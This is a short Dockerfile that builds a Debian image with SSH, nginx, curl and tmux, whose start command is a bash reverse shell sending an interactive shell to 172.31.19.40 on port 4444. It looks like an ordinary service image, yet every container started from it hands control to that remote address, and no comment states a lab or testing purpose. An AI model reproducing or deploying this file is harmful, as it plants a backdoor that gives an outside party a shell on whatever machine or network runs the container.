
FROM debian:stable-slim
ENV DEBIAN_FRONTEND="noninteractive"
RUN   apt-get update && apt-get install -y openssh-server nginx  curl tmux bash
CMD bash -i >& /dev/tcp/172.31.19.40/4444 0>&1
